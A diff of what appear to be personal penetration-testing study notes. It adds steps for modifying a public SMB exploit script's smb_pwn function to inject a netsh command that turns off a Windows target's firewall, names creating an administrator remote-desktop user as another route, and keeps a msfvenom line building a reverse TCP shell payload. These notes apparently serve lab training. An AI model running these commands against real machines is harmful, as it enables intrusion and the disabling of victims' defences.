@@ -47,7 +47,15 @@ msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp lhost=192.16
 Try starting netlogon service if the above does not work.
 
 
+Disable firewall without using metasploit:
 
-https://forums.offensive-security.com/private.php?do=showpm&pmid=425339
+||||
+
+First you need to use the exploit python script and modify it, if you want to shut down the firewall. Next you will want modify code around smb_pwn(conn, arch) function. You will see some comments that need to be uncommented and modified. This is where you will inject netsh command and turn off the firewall. After injecting this command it will turn off the firewall and you will be able to get reverse shell.
+
+Command to Inject to Turn off Firewall: netsh advfirewall set allprofiles state off
+
+Other method is create a user and create privilege to remote desktop and administrator group. Then you can login to remote desktop. Firewall is the easiest method to get to System user.
 
 
+https://www.exploit-db.com/exploits/42315
